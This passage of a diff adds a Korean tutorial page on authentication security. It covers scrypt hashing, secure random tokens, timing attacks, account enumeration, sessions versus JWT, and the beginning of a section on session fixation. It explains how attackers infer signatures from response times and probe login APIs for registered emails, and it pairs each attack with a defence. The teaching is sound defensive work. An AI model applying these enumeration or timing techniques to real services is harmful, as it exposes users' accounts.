+            ><span class="part green" data-label="scrypt 결과 키 64바이트 (hex 128자)">f79c642d5da7f736…</span>
+            <span class="anatomy-caption">사용자 A의 비밀번호 칸에 저장되는 값</span>
+          </div>
+
+          <h3>실제로 어떻게 쓰나: 로그인할 때 확인</h3>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">POST /auth/sign-in <small>A의 이메일, password1</small></li>
+              <li data-from="2" data-to="3">이메일로 계정을 찾는다</li>
+              <li class="reply" data-from="3" data-to="2">저장된 값 <small>9f2c41d0…:f79c642d…</small></li>
+              <li data-at="2">콜론으로 나눈다 <small>솔트 9f2c41d0…, 키 f79c642d…</small></li>
+              <li data-at="2">scrypt(입력한 password1, 같은 솔트) <small>→ f79c642d…</small></li>
+              <li data-at="2">저장된 키와 비교한다 <small>같으면 비밀번호가 맞다</small></li>
+            </ol>
+          </div>
+          <p>
+            같은 솔트와 같은 비밀번호를 넣으면 같은 키가 나오므로, 원문을 저장하지 않고도 비밀번호를 확인할 수 있다. 실제
+            코드는 <a href="04-비밀번호-해시와-확인.html">04 비밀번호 해시</a>에서 본다.
+          </p>
+        </section>
+
+        <section id="kdf">
+          <h2>느린 해시: scrypt, bcrypt, Argon2</h2>
+          <p>
+            SHA-256은 빠르게 만들어졌다. 요즘 GPU 하나로 1초에 수십억 번 계산한다. 비밀번호 해시가 유출되면 공격자는
+            흔한 비밀번호 목록을 넣어 보며 맞는 것을 찾는데, 해시가 빠르면 이 시도도 빠르다.
+          </p>
+          <p>
+            비밀번호용 해시는 일부러 <strong>느리게</strong> 만든다. 로그인할 때 수십 ms 더 걸리는 것은 사용자가 느끼지
+            못하지만, 수없이 시도해야 하는 공격자에게는 그 시간이 시도 횟수만큼 곱해진다.
+          </p>
+          <p>아래는 이 개발 기기의 CPU 한 코어에서 <code>password1</code>을 해시하는 데 걸린 시간을 잰 것이다.</p>
+          <div class="timeline" style="--tl-max: 70; --tl-label: 10rem" data-unit="ms" data-tick="10">
+            <div class="tl-row">
+              <span class="tl-label">SHA-256<small>약 0.0007ms, 실제로는 이 점보다 짧다</small></span>
+              <div class="tl-track">
+                <span class="tl-bar blue" style="--from: 0; --to: 0.3"></span>
+              </div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label">scrypt<small>이 프로젝트 설정, 약 58ms</small></span>
+              <div class="tl-track">
+                <span class="tl-bar green" style="--from: 0; --to: 58">scrypt 한 번</span>
+              </div>
+            </div>
+          </div>
+          <p>사용자에게 58ms는 눈 깜빡할 새다. 하지만 공격자가 훔친 해시 하나에 비밀번호 후보 1억 개를 넣어 보면 이렇게 된다.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th></th>
+                  <th>한 번</th>
+                  <th>후보 1억 개 (같은 CPU 한 코어)</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>SHA-256</td>
+                  <td>약 0.0007ms</td>
+                  <td>약 70초</td>
+                </tr>
+                <tr>
+                  <td>scrypt (N=16384, r=16)</td>
+                  <td>약 58ms</td>
+                  <td>약 67일</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            실제 공격자는 코어를 많이 쓰므로 절대 시간은 줄어든다. 하지만 SHA-256에 비해 한 번에 수만 배 비싸다는 비율은
+            그대로 남고, scrypt는 아래에서 보듯 GPU로도 쉽게 줄일 수 없게 만들어졌다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>알고리즘</th>
+                  <th>느리게 만드는 방법</th>
+                  <th>비고</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>bcrypt</td>
+                  <td>반복 횟수(cost)</td>
+                  <td>오래 쓰였다. 입력이 72바이트에서 잘린다</td>
+                </tr>
+                <tr>
+                  <td>scrypt</td>
+                  <td>반복과 함께 큰 메모리를 요구한다(메모리 하드)</td>
+                  <td>Node의 <code>node:crypto</code>에 들어 있다</td>
+                </tr>
+                <tr>
+                  <td>Argon2id</td>
+                  <td>메모리, 반복, 병렬도를 따로 정한다</td>
+                  <td>OWASP가 첫 번째로 권한다. Node에서는 별도 패키지가 필요하다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            "메모리 하드"는 계산 한 번에 큰 메모리를 쓰게 한다는 뜻이다. GPU나 전용 칩은 연산 장치는 많지만 장치마다
+            쓸 메모리가 적어서, 동시에 많이 돌리기 어려워진다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">이 프로젝트의 scrypt 한 번</span>
+              <span class="pipe-val secret">password1<small>NFKC 정규화한 비밀번호</small></span>
+              <span class="pipe-note">+</span>
+              <span class="pipe-val">9f2c41d0…<small>솔트 16바이트</small></span>
+              <span class="pipe-fn">scrypt (N=16384, r=16, p=1)</span>
+              <span class="pipe-val ok">f79c642d5da7…<small>키 64바이트</small></span>
+            </div>
+          </div>
+          <ul>
+            <li><strong>N=16384</strong>: 반복하고 메모리를 늘리는 크기. 클수록 느리고 메모리를 많이 쓴다.</li>
+            <li><strong>r=16</strong>: 한 덩어리의 크기. 메모리 사용량은 약 128 × N × r = 32MiB다.</li>
+            <li><strong>p=1</strong>: 병렬로 나눠 계산하는 개수.</li>
+          </ul>
+          <p>
+            해시 한 번에 32MiB가 필요하므로, 메모리가 8GB인 장치라도 동시에 돌릴 수 있는 계산은 수백 개 수준으로 묶인다.
+          </p>
+          <pre><code class="language-ts">import { randomBytes, scrypt } from 'node:crypto';
+
+const salt = randomBytes(16).toString('hex');
+scrypt('password1', salt, 64, { N: 16384, r: 16, p: 1, maxmem: 64 * 1024 * 1024 }, (error, key) =&gt; {
+  // key: 64바이트 Buffer. 저장할 때는 `${salt}:${key.toString('hex')}`처럼 솔트와 함께 둔다.
+});</code></pre>
+          <p>
+            이런 함수를 키 유도 함수(KDF, key derivation function)라고도 부른다. 비밀번호에서 고정 길이의 키를 "뽑아내는"
+            함수라는 뜻이다.
+          </p>
+        </section>
+
+        <section id="random">
+          <h2>난수와 엔트로피</h2>
+          <p>
+            세션 토큰, 솔트, 이메일 인증번호처럼 남이 맞히면 안 되는 값은 <strong>암호학적으로 안전한 난수</strong>로
+            만든다. <code>Math.random()</code>은 빠르고 고르게 퍼지지만, 지금까지 나온 값을 보면 다음 값을 예측할 수 있는
+            방식이라 이 용도에 쓰지 않는다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">Math.random(): 계산식으로 만든 "무작위처럼 보이는" 수</span>
+              <span class="pipe-val">0.4180… 0.9312… 0.0857…<small>공격자가 본 출력 몇 개</small></span>
+              <span class="pipe-fn">내부 상태 되살리기</span>
+              <span class="pipe-val bad">다음 값 0.6623…<small>미리 안다</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">crypto.randomInt(): 운영체제가 모은 예측 불가능한 값에서 뽑는다</span>
+              <span class="pipe-val">J 7 q c…<small>공격자가 본 출력</small></span>
+              <span class="pipe-fn blocked">다음 값 계산</span>
+              <span class="pipe-val ok">?<small>앞의 값으로 알 수 없다</small></span>
+            </div>
+          </div>
+          <p>
+            위 숫자는 모양을 보여 주려고 지어낸 값이다. 실제로 V8의 <code>Math.random()</code>은 작은 내부 상태를 계산식으로
+            굴려 수를 내는데, 출력 몇 개로 그 상태를 되살려 다음 값을 맞힌 사례가 알려져 있다. 그러면 세션 토큰을 이걸로
+            만들었을 때, 공격자가 자기 토큰 몇 개를 받아 보고 다른 사람이 받을 토큰을 맞힐 수 있다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>쓸 것</th>
+                  <th>쓰지 않을 것</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>
+                    Node: <code>crypto.randomBytes</code>, <code>crypto.randomInt</code>, <code>crypto.randomUUID</code><br />
+                    브라우저: <code>crypto.getRandomValues</code>, <code>crypto.randomUUID</code>
+                  </td>
+                  <td><code>Math.random()</code>, <code>Date.now()</code>, 자동 증가 id</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>엔트로피: 몇 번 넣어 봐야 맞히나</h3>
+          <p>
+            <strong>엔트로피</strong>는 값이 얼마나 예측하기 어려운지를 비트로 센다. 가능한 경우의 수가 2<sup>n</sup>이면
+            n비트다. 동전 한 번은 1비트, 동전 열 번은 10비트(1,024가지)다.
+          </p>
+          <p>
+            문자 종류가 <code>k</code>개인 글자를 <code>L</code>자 뽑으면 경우의 수는 <code>k<sup>L</sup></code>이고,
+            엔트로피는 <code>L × log₂(k)</code>비트다. 자리마다 다이얼이 하나씩 있는 자물쇠를 떠올리면 된다.
+          </p>
+          <div class="anatomy">
+            <span class="part blue" data-label="62가지">a</span><span class="part blue" data-label="× 62가지">B</span
+            ><span class="part blue" data-label="× 62가지">3</span><span class="part blue" data-label="× 62가지">x</span
+            ><span class="part dim" data-label="… 28자리 더">…</span
+            ><span class="part blue" data-label="× 62가지">Q</span>
+            <span class="anatomy-caption">
+              세션 토큰 32자리. 자리마다 영문 대소문자와 숫자 62가지 중 하나다. 경우의 수는 62를 32번 곱한 수 ≈ 2<sup>190</sup>이다.
+            </span>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>값</th>
+                  <th>계산</th>
+                  <th>엔트로피</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>숫자 6자리 인증번호</td>
+                  <td>6 × log₂(10) ≈ 6 × 3.32</td>
+                  <td>약 20비트 (100만 가지)</td>
+                </tr>
+                <tr>
+                  <td>영문 대소문자와 숫자 62종 중 32자</td>
+                  <td>32 × log₂(62) ≈ 32 × 5.95</td>
+                  <td>약 190비트</td>
+                </tr>
+                <tr>
+                  <td>무작위 16바이트</td>
+                  <td>16 × 8</td>
+                  <td>128비트</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            128비트를 넘으면 지구의 모든 컴퓨터로 계속 넣어 봐도 맞힐 수 없다고 본다. 6자리 인증번호처럼 엔트로피가 작은
+            값은 시도 횟수 제한과 짧은 만료로 함께 지켜야 한다.
+          </p>
+
+          <h3>모듈로 편향(modulo bias)</h3>
+          <p>
+            무작위 바이트(0~255)를 62로 나눈 나머지로 글자를 고르면 고르지 않다. 256은 62로 나누어떨어지지 않아서, 나머지
+            0~7이 다른 값보다 한 번씩 더 나온다. <code>crypto.randomInt(62)</code>는 이런 편향 없이 0~61을 고르게 뽑는다.
+          </p>
+          <div class="timeline" style="--tl-max: 256; --tl-label: 8rem" data-unit="" data-tick="62">
+            <div class="tl-row">
+              <span class="tl-label">바이트 0~255<small>% 62로 접으면</small></span>
+              <div class="tl-track">
+                <span class="tl-bar blue" style="--from: 0; --to: 62">0~61</span>
+                <span class="tl-bar blue" style="--from: 62; --to: 124">0~61</span>
+                <span class="tl-bar blue" style="--from: 124; --to: 186">0~61</span>
+                <span class="tl-bar blue" style="--from: 186; --to: 248">0~61</span>
+                <span class="tl-bar faded" style="--from: 248; --to: 256"></span>
+                <span class="tl-event end" style="--at: 248">248~255 → 0~7 한 번 더</span>
+              </div>
+            </div>
+          </div>
+          <p>
+            0~61은 네 바퀴를 온전히 돌고, 남은 8개(248~255)가 다시 0~7로 떨어진다. 그래서 0~7은 256번 중 5번, 나머지는
+            4번 나온다. 한 글자에서는 작은 차이지만 공격자가 노릴 수 있는 쏠림이다. <code>randomInt</code>는 남는 구간에
+            걸린 값을 버리고 다시 뽑아 이 쏠림을 없앤다.
+          </p>
+          <pre><code class="language-ts">import { randomBytes, randomInt } from 'node:crypto';
+
+const biased = randomBytes(1)[0] % 62; // 0~7이 조금 더 자주 나온다
+const uniform = randomInt(62); // 0~61이 같은 확률로 나온다</code></pre>
+        </section>
+
+        <section id="timing">
+          <h2>타이밍 공격과 상수 시간 비교</h2>
+          <p>
+            문자열 비교 <code>a === b</code>는 앞에서부터 한 글자씩 보다가 다른 글자를 만나면 바로 멈춘다. 첫 글자가 틀리면
+            빨리 끝나고, 열 글자째에서 틀리면 조금 늦게 끝난다.
+          </p>
+          <p>
+            공격자가 서명을 한 글자씩 바꿔 가며 보내고 응답 시간을 아주 많이 재면, 어느 글자에서 조금 더 오래 걸렸는지로
+            맞는 글자를 하나씩 알아낼 수 있다. 금고 다이얼을 돌리며 딸깍 소리를 듣는 것과 같다. 이것이
+            <strong>타이밍 공격</strong>이다.
+          </p>
+          <p>
+            맞는 서명이 base64 44자 <code>pexhWn01…</code>이라고 하자. 공격자가 보낸 서명마다 <code>===</code>가 몇 글자를 보고
+            멈추는지 그리면 이렇다(앞 8글자만 그렸다). 막대가 길수록 응답이 아주 조금 늦다.
+          </p>
+          <div class="timeline" style="--tl-max: 8; --tl-label: 11rem" data-unit="글자" data-tick="1">
+            <div class="tl-row">
+              <span class="tl-label"><code>a</code>xxxxxxx…<small>첫 글자부터 틀림</small></span>
+              <div class="tl-track"><span class="tl-bar faded" style="--from: 0; --to: 1"></span></div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label"><code>p</code>xxxxxxx…<small>첫 글자 맞음</small></span>
+              <div class="tl-track"><span class="tl-bar blue" style="--from: 0; --to: 2">2글자 비교</span></div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label"><code>pe</code>xxxxxx…<small>두 글자 맞음</small></span>
+              <div class="tl-track"><span class="tl-bar blue" style="--from: 0; --to: 3">3글자 비교</span></div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label"><code>pex</code>xxxxx…<small>세 글자 맞음</small></span>
+              <div class="tl-track"><span class="tl-bar blue" style="--from: 0; --to: 4">4글자 비교</span></div>
+            </div>
+          </div>
+          <p>
+            공격자는 첫 자리에 base64 글자 64가지를 하나씩 넣어 보고, 유독 오래 걸린 <code>p</code>를 찾는다. 그다음 둘째 자리를
+            같은 방법으로 찾는다. 한 번에 전부 맞혀야 하면 64<sup>44</sup>가지를 뒤져야 하지만, 한 자리씩 맞히면 많아야 64 × 44번의 추측으로
+            줄어든다. 실제 차이는 나노초 단위라 한 번 재서는 알 수 없고, 같은 요청을 아주 많이 보내 평균을 내야 한다.
+          </p>
+          <p>
+            막는 방법은 어디서 틀렸든 늘 끝까지 비교하는 것이다. Node의 <code>crypto.timingSafeEqual</code>이 그 일을 한다.
+          </p>
+          <div class="timeline" style="--tl-max: 8; --tl-label: 11rem" data-unit="글자" data-tick="1">
+            <div class="tl-row">
+              <span class="tl-label"><code>a</code>xxxxxxx…<small>timingSafeEqual</small></span>
+              <div class="tl-track"><span class="tl-bar green" style="--from: 0; --to: 8">늘 끝까지</span></div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label"><code>pex</code>xxxxx…<small>timingSafeEqual</small></span>
+              <div class="tl-track"><span class="tl-bar green" style="--from: 0; --to: 8">늘 끝까지</span></div>
+            </div>
+          </div>
+          <p>어느 글자가 틀렸든 걸리는 시간이 같으므로, 시간을 재도 알 수 있는 것이 없다.</p>
+          <pre><code class="language-ts">import { timingSafeEqual } from 'node:crypto';
+
+const expected = Buffer.from(expectedSignature);
+const actual = Buffer.from(receivedSignature);
+// 길이가 다르면 timingSafeEqual이 예외를 던지므로 먼저 길이를 본다.
+const ok = expected.length === actual.length &amp;&amp; timingSafeEqual(expected, actual);</code></pre>
+          <p>
+            길이를 먼저 비교하면 길이는 드러나지만, 서명이나 해시처럼 길이가 정해진 값은 길이가 비밀이 아니므로 괜찮다.
+          </p>
+          <p>
+            시간 차이는 비교 함수에서만 생기지 않는다. "없는 계정이면 바로 응답, 있는 계정이면 느린 해시를 계산한 뒤 응답"처럼
+            코드 경로마다 걸리는 시간이 다르면 그 차이로도 정보가 드러난다(<a href="#enumeration">계정 열거</a>).
+          </p>
+        </section>
+
+        <section id="enumeration">
+          <h2>계정 열거</h2>
+          <p>
+            <strong>계정 열거</strong>(account enumeration)는 서비스의 반응 차이로 어떤 이메일이 가입되어 있는지 알아내는
+            것이다. 가입된 이메일 목록을 알면 그 계정들에만 흔한 비밀번호를 넣어 보거나, 그 사람에게 그럴듯한 피싱 메일을
+            보낼 수 있다.
+          </p>
+          <h3>허술한 서버에서는 이렇게 알아낸다</h3>
+          <p>여기서 허술한 서버는 없는 이메일과 틀린 비밀번호에 서로 다르게 응답하는 서버를 말한다.</p>
+          <p>
+            공격자는 어디선가 구한 이메일 목록을 로그인 API에 하나씩 넣어 본다. 비밀번호는 아무 값이나 넣는다. 로그인이
+            될 필요는 없다. 응답이 서로 다르기만 하면 된다.
+          </p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>공격자</li>
+              <li>허술한 로그인 API</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">POST /auth/sign-in <small>nobody@mail.com / 아무 값</small></li>
+              <li data-from="2" data-to="3">이메일로 계정 찾기</li>
+              <li class="reply" data-from="3" data-to="2">없다</li>
+              <li class="reply stop" data-from="2" data-to="1">404 "없는 이메일입니다" <small>해시를 건너뛰어 2ms 만에 응답</small></li>
+              <li data-from="1" data-to="2">POST /auth/sign-in <small>mina@mail.com / 아무 값</small></li>
+              <li data-from="2" data-to="3">이메일로 계정 찾기</li>
+              <li class="reply" data-from="3" data-to="2">있다 <small>저장된 비밀번호 해시</small></li>
+              <li data-at="2">입력값을 해시해 비교 <small>약 60ms</small></li>
+              <li class="reply stop" data-from="2" data-to="1">401 "비밀번호가 틀렸습니다" <small>62ms 만에 응답</small></li>
+              <li class="seq-note">문구도 다르고 시간도 다르다 → mina@mail.com은 가입된 이메일이다</li>
+            </ol>
+          </div>
+          <p>
+            문구를 하나로 맞춰도 시간이 다르면 여전히 드러난다. 가입된 이메일만 느린 해시를 계산하기 때문이다. 아래 시간 막대의
+            위 두 줄이 허술한 서버, 아래 두 줄이 이 프로젝트의 서버다. 시간은 설명을 위해 고른 예시 값이다(해시 시간은
+            <a href="04-비밀번호-해시와-확인.html">04 비밀번호 해시</a>에서 잰 약 60ms를 썼다).
+          </p>
+          <div class="timeline" style="--tl-max: 70; --tl-label: 11rem" data-unit="ms" data-tick="10">
+            <div class="tl-row">
+              <span class="tl-label">허술한 서버<small>없는 이메일</small></span>
+              <div class="tl-track">
+                <span class="tl-bar faded" style="--from: 0; --to: 2"></span>
+                <span class="tl-event" style="--at: 2">2ms 응답</span>
+              </div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label">허술한 서버<small>가입된 이메일, 틀린 비밀번호</small></span>
+              <div class="tl-track">
+                <span class="tl-bar faded" style="--from: 0; --to: 62">해시 비교</span>
+                <span class="tl-event end" style="--at: 62">62ms 응답</span>
+              </div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label">이 프로젝트<small>없는 이메일</small></span>
+              <div class="tl-track">
+                <span class="tl-bar green" style="--from: 0; --to: 62">버릴 해시를 한 번 계산</span>
+                <span class="tl-event end" style="--at: 62">62ms 응답</span>
+              </div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label">이 프로젝트<small>가입된 이메일, 틀린 비밀번호</small></span>
+              <div class="tl-track">
+                <span class="tl-bar green" style="--from: 0; --to: 62">해시 비교</span>
+                <span class="tl-event end" style="--at: 62">62ms 응답</span>
+              </div>
+            </div>
+          </div>
+          <h3>이 프로젝트의 응답</h3>
+          <p>
+            <code>verifyCredentials</code>는 두 경우 모두 같은 일을 하고 같은 오류를 던진다. 공격자 쪽에서 보면 두 응답을
+            구별할 단서가 없다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">가입 안 된 이메일</span>
+              <span class="pipe-val">nobody@mail.com<small>아무 비밀번호</small></span>
+              <span class="pipe-fn">계정 없음 → 해시를 한 번 계산해 버림</span>
+              <span class="pipe-val bad">401 INVALID_CREDENTIALS<small>약 60ms</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">가입된 이메일, 틀린 비밀번호</span>
+              <span class="pipe-val">mina@mail.com<small>틀린 비밀번호</small></span>
+              <span class="pipe-fn">저장된 해시와 비교 → 다름</span>
+              <span class="pipe-val bad">401 INVALID_CREDENTIALS<small>약 60ms</small></span>
+            </div>
+          </div>
+          <pre><code>HTTP/1.1 401 Unauthorized
+Content-Type: application/problem+json
+
+{
+  "type": "about:blank",
+  "title": "Unauthorized",
+  "status": 401,
+  "detail": "이메일 또는 비밀번호가 올바르지 않습니다.",
+  "code": "INVALID_CREDENTIALS"
+}</code></pre>
+          <p>정리하면 가입 여부가 드러나는 곳과 막는 법은 다음과 같다.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>드러나는 곳</th>
+                  <th>예</th>
+                  <th>막는 법</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>오류 메시지</td>
+                  <td>"없는 이메일입니다" / "비밀번호가 틀렸습니다"</td>
+                  <td>"이메일 또는 비밀번호가 올바르지 않습니다" 하나로 응답한다</td>
+                </tr>
+                <tr>
+                  <td>응답 시간</td>
+                  <td>없는 이메일은 해시를 건너뛰어 빨리 응답한다</td>
+                  <td>없는 이메일에서도 해시를 한 번 계산한다</td>
+                </tr>
+                <tr>
+                  <td>다른 화면</td>
+                  <td>가입 화면의 "이미 가입된 이메일입니다", 비밀번호 재설정의 "없는 계정입니다"</td>
+                  <td>재설정은 "가입되어 있다면 메일을 보냈습니다"로 응답한다. 가입 화면은 편의와 맞바꿔 정한다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            가입 화면까지 완전히 막으면 사용자가 "이미 가입했는지"를 알 수 없어 불편하다. 그래서 많은 서비스가 로그인과
+            재설정은 막고, 가입은 속도 제한으로 대량 조회를 어렵게 하는 정도로 타협한다.
+          </p>
+        </section>
+
+        <section id="session-vs-jwt">
+          <h2>세션과 JWT</h2>
+          <p>
+            로그인 뒤 "이 요청은 42번 사용자가 보냈다"를 아는 방법은 크게 두 가지다.
+          </p>
+          <ul>
+            <li>
+              <strong>세션(서버가 기억하는 방식):</strong> 서버가 DB에 "토큰 abc는 42번 사용자, 7일 뒤 만료"를 적어 두고,
+              브라우저에는 의미 없는 토큰 <code>abc</code>만 준다. 요청마다 DB에서 찾아본다. 옷 보관소의 번호표와 같다.
+              번호표에는 아무 정보도 없고, 옷은 보관소에 있다.
+            </li>
+            <li>
+              <strong>JWT(토큰이 스스로 말하는 방식):</strong> "42번 사용자, 7일 뒤 만료"라는 내용 자체를 토큰에 담고 서버의
+              비밀키로 <a href="#hmac">서명</a>한다. 서버는 서명만 확인하면 되고 DB를 보지 않는다. 사진과 도장이 찍힌
+              신분증과 같다.
+            </li>
+          </ul>
+          <h3>토큰을 열어 보면</h3>
+          <p>두 방식이 브라우저에 주는 값을 나란히 놓으면 차이가 바로 보인다. 먼저 이 프로젝트의 세션 쿠키 값이다.</p>
+          <div class="anatomy">
+            <span class="part warn" data-label="무작위 토큰 32자">aB3xK9pQ…</span><span class="part dim" data-label="구분">.</span><span class="part blue" data-label="HMAC 서명">Xk2f…=</span>
+            <span class="anatomy-caption">토큰은 무작위 글자일 뿐이라, 쿠키를 훔쳐 봐도 누구의 세션인지, 언제 끝나는지 알 수 없다. 그 정보는 서버 DB에만 있다.</span>
+          </div>
+          <p>다음은 같은 내용을 JWT로 만든 값이다. 점(<code>.</code>)으로 나뉜 세 부분이다.</p>
+          <div class="anatomy">
+            <span class="part dim" data-label="헤더">eyJhbGci…</span><span class="part dim" data-label="구분">.</span><span class="part green" data-label="내용(payload)">eyJzdWIiOiI0MiIsImV4cCI6MTc2MzgwMDAwMH0</span><span class="part dim" data-label="구분">.</span><span class="part blue" data-label="서명">SflKxw…</span>
+            <span class="anatomy-caption">헤더와 내용은 암호화가 아니라 base64url로 글자만 바꾼 것이다. 누구나 되돌려 읽을 수 있다.</span>
+          </div>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">JWT의 내용 부분은 누구나 읽는다</span>
+              <span class="pipe-val">eyJzdWIiOiI0MiIs…</span>
+              <span class="pipe-fn green">base64url 디코딩 (비밀키 필요 없음)</span>
+              <span class="pipe-val">{"sub":"42","exp":1763800000}<small>42번 사용자, 이 시각에 만료</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">내용을 고치면 서명이 맞지 않는다</span>
+              <span class="pipe-val bad">{"sub":"1", …}<small>1번(관리자)으로 바꿔 치기</small></span>
+              <span class="pipe-fn">서버가 비밀키로 서명을 다시 계산</span>
+              <span class="pipe-val bad">서명 불일치 → 401</span>
+            </div>
+          </div>
+          <p>
+            JWT는 읽을 수는 있어도 고칠 수는 없다. 그래서 비밀번호나 개인정보는 JWT 안에 넣지 않는다.
+          </p>
+          <h3>요청 한 번에 서버가 하는 일</h3>
+          <p><strong>DB 세션:</strong> 요청마다 DB에서 토큰을 찾는다.</p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">GET /me <small>Cookie: aB3xK9pQ….Xk2f…</small></li>
+              <li data-at="2">서명 확인, 토큰 해시</li>
+              <li data-from="2" data-to="3">sessions에서 token_hash로 찾기</li>
+              <li class="reply" data-from="3" data-to="2">42번 사용자, 만료 전</li>
+              <li class="reply" data-from="2" data-to="1">200</li>
+            </ol>
+          </div>
+          <p><strong>JWT:</strong> 서명만 확인하고 토큰 안의 내용을 그대로 믿는다. DB에 가지 않는다.</p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">GET /me <small>Authorization: Bearer eyJhbGci…</small></li>
+              <li data-at="2">서명 확인 <small>비밀키로 다시 계산해 비교</small></li>
+              <li data-at="2">내용 읽기 <small>sub 42, exp 아직 안 지남</small></li>
+              <li class="reply" data-from="2" data-to="1">200 <small>DB 조회 없음</small></li>
+            </ol>
+          </div>
+          <h3>로그아웃을 눌렀을 때</h3>
+          <p>
+            둘째 날에 사용자가 로그아웃했다고 하자. 7일 동안 유효하게 만든 세션과 JWT가 그 뒤 어떻게 되는지 비교한다.
+            도둑이 미리 토큰을 복사해 두었다면 이 차이가 곧 피해 기간이다.
+          </p>
+          <div class="timeline" style="--tl-max: 8; --tl-label: 8rem" data-unit="일">
+            <div class="tl-row">
+              <span class="tl-label">DB 세션</span>
+              <div class="tl-track">
+                <span class="tl-bar green" style="--from: 0; --to: 2">유효</span>
+                <span class="tl-event" style="--at: 2">로그아웃: 행 삭제, 바로 끝</span>
+              </div>
+            </div>
+            <div class="tl-row">
+              <span class="tl-label">JWT<small>차단 목록 없음</small></span>
+              <div class="tl-track">
+                <span class="tl-bar blue" style="--from: 0; --to: 7">로그아웃 뒤에도 통과한다</span>
+                <span class="tl-event" style="--at: 2">로그아웃</span>
+                <span class="tl-event end" style="--at: 7">exp 도달</span>
+              </div>
+            </div>
+          </div>
+          <p>
+            JWT는 서버가 아무것도 기억하지 않으므로, 브라우저 쪽 토큰을 지워도 복사본은 <code>exp</code>까지 계속
+            통과한다. 이 프로젝트가 DB 세션을 고른 이유 가운데 하나다(ADR 0009).
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th></th>
+                  <th>DB 세션</th>
+                  <th>JWT</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>요청마다 저장소 조회</td>
+                  <td>한다</td>
+                  <td>하지 않는다</td>
+                </tr>
+                <tr>
+                  <td>즉시 끊기 (로그아웃, 탈퇴, 도난)</td>
+                  <td>행을 지우면 끝</td>
+                  <td>만료까지 유효하다. 끊으려면 차단 목록을 저장해야 해서 결국 조회가 생긴다</td>
+                </tr>
+                <tr>
+                  <td>토큰 안의 정보</td>
+                  <td>없다 (무작위 값)</td>
+                  <td>누구나 읽는다 (서명일 뿐 암호화가 아니다)</td>
+                </tr>
+                <tr>
+                  <td>잘 맞는 곳</td>
+                  <td>서버가 적고, 즉시 끊기가 중요한 서비스</td>
+                  <td>서버가 많거나, 여러 서비스가 저장소를 공유하지 않고 같은 사용자를 확인해야 할 때</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            JWT의 즉시 끊기 문제를 줄이려고 짧게 사는 액세스 토큰과 오래 사는 리프레시 토큰을 함께 쓰기도 한다. 이때
+            리프레시 토큰은 서버에 저장해 끊을 수 있게 하므로, 결국 세션과 비슷한 저장소가 다시 생긴다.
+          </p>
+        </section>
+
+        <section id="session-fixation">
+          <h2>세션 고정</h2>
+          <p>
+            <strong>세션 고정</strong>(session fixation)은 공격자가 미리 알고 있는 세션 토큰을 피해자 브라우저에 심어 두고,
+            피해자가 그 토큰을 쓴 채로 로그인하기를 기다리는 공격이다. 로그인할 때 서버가 기존 토큰에 "이제 이 사람은
+            로그인했다"고만 적으면, 공격자는 자기가 아는 그 토큰으로 피해자로 로그인된다.
+          </p>
+          <p>
+            옷 보관소에 빗대면, 도둑이 번호표 7번을 미리 받아 손님 주머니에 넣어 두는 것과 같다. 손님이 그 번호표로 옷을
+            맡기면, 같은 번호를 아는 도둑도 그 옷을 찾아갈 수 있다.
+          </p>
+          <h3>심어 둔 토큰이 어떻게 유효한가</h3>
+          <p>
+            공격자가 지어낸 아무 값은 서버가 받아 주지 않는다. 그래서 이 공격은 심어 둔 X가 서버 입장에서 진짜 토큰일 때만
+            성립한다. X가 진짜가 되는 길은 두 가지다.
+          </p>
+          <ol class="steps blue">
+            <li>
